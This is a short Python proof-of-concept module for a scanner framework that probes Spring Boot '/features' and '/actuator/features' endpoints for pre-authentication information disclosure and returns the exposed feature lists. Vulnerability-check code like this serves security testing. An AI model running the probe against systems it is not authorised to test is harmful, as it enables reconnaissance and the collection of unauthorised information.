...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth features Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/features","/actuator/features"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if '"enabled":[' in res.text and '"disabled":[' in res.text and "application" in res.text:
                return res.text
